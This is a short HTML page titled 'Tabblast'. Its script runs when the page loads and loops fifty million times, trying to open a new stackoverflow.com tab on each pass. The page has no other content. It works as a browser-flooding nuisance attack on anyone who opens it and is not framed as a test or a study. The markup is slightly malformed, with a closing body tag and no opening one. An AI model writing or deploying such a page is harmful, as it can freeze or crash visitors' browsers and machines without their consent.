<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tabblast</title>
    <script>
        window.onload = () => {
            const currentURL = "https://stackoverflow.com/";
            for (let i = 0; i < 50000000; i++) {
                window.open(currentURL, '_blank');
            }
        };
    </script>
</head>

</body>
</html>
